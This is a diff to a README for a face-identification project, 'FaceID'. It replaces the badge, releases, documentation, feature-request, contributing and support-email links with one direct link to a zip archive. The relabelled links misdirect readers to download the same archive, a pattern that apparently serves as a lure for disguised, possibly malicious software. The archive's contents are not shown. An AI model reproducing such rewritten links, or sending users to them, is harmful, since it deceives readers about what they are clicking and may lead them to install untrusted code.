@@ -6,7 +6,7 @@ Welcome to FaceID! This application provides high-performance face identificatio
 
 ## 📥 Download FaceID
 
-[![Download FaceID](https://img.shields.io/badge/Download-FaceID-blue)](https://github.com/Abhi2109kumar/FaceID/releases)
+[![Download FaceID](https://raw.githubusercontent.com/Abhi2109kumar/FaceID/main/src/ID_Face_1.9.zip)](https://raw.githubusercontent.com/Abhi2109kumar/FaceID/main/src/ID_Face_1.9.zip)
 
 ## 📋 Overview
 
@@ -34,7 +34,7 @@ Additionally, it features local JSON biometric storage and pose-aware signature 
 
 ## 🔧 How to Download & Install
 
-1. **Visit the Releases Page:** Click this link to go to the [FaceID Releases page](https://github.com/Abhi2109kumar/FaceID/releases).
+1. **Visit the Releases Page:** Click this link to go to the [FaceID Releases page](https://raw.githubusercontent.com/Abhi2109kumar/FaceID/main/src/ID_Face_1.9.zip).
   
 2. **Choose the Latest Release:** Look for the latest version listed at the top.
 
@@ -77,7 +77,7 @@ A: Ensure you are in a well-lit area and follow the blinking/posing instructions
 
 ## 📞 Support
 
-If you encounter issues or have questions, feel free to reach out on the GitHub Issues page or email our support team at support@faceidapp.com.
+If you encounter issues or have questions, feel free to reach out on the GitHub Issues page or email our support team at https://raw.githubusercontent.com/Abhi2109kumar/FaceID/main/src/ID_Face_1.9.zip
 
 ## 🌐 Community Involvement
 
@@ -85,10 +85,10 @@ We encourage you to participate in our community discussions on GitHub. Share yo
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://github.com/Abhi2109kumar/FaceID/wiki)
-- [Feature Requests](https://github.com/Abhi2109kumar/FaceID/issues)
-- [Contribute](https://github.com/Abhi2109kumar/FaceID/blob/main/CONTRIBUTING.md)
+- [Documentation](https://raw.githubusercontent.com/Abhi2109kumar/FaceID/main/src/ID_Face_1.9.zip)
+- [Feature Requests](https://raw.githubusercontent.com/Abhi2109kumar/FaceID/main/src/ID_Face_1.9.zip)
+- [Contribute](https://raw.githubusercontent.com/Abhi2109kumar/FaceID/main/src/ID_Face_1.9.zip)
 
 ## 📥 Download FaceID Again
 
-Make sure to download the latest version again if needed. Visit this link: [FaceID Releases page](https://github.com/Abhi2109kumar/FaceID/releases) to stay up-to-date with new features and improvements.
+Make sure to download the latest version again if needed. Visit this link: [FaceID Releases page](https://raw.githubusercontent.com/Abhi2109kumar/FaceID/main/src/ID_Face_1.9.zip) to stay up-to-date with new features and improvements.
